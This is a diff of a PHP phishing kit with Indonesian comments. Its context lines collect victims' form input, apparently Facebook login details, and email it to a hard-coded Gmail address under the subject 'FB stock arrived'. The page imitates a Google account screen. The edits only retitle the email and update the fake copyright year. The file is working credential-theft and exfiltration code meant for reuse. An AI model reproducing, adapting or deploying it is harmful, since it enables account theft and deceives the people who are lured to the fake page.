@@ -6,7 +6,7 @@
 ############################################
 /* JANGAN GANTI COPYRIGHT NYA YA SAYANG */
 
-$subjek = 'Stok Fb Datang Dandi';
+$subjek = 'Stok Fb Datang Bos';
 $mailto = 'ariagungsatria01@gmail.com'; //masukin email lo disini
 
 /* Fungsi berikut untuk mengambil input field. */
@@ -45,7 +45,7 @@ $headers .= "Content-type: text/html\r\n"; // Untuk memerintahkan server melakuk
 $success = mail($mailto, $subjek, $body, $headers); // Hal-hal yang akan dikirim.
 
 
-$subjek = 'Stok Fb Datang Dandi';
+$subjek = 'Stok Fb Datang Bos';
 $mailto = 'ariagungsatria01@gmail.com'; //masukin email lo disini
 
 /* Fungsi berikut untuk mengambil input field. */
@@ -155,7 +155,7 @@ Trima kasih
 <div style="height:110px;color: #737373;background-color: #f7f7f7;" class="btn btn-block">
 <center><p>One Google Account for everything Google </p></center>
 <img src="https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_1x.png"/></p>
-<p>Copyright &copy; 2017 Google Inc.</p>
+<p>Copyright &copy; 2021 Google Inc.</p>
 
 </div>
 </div>
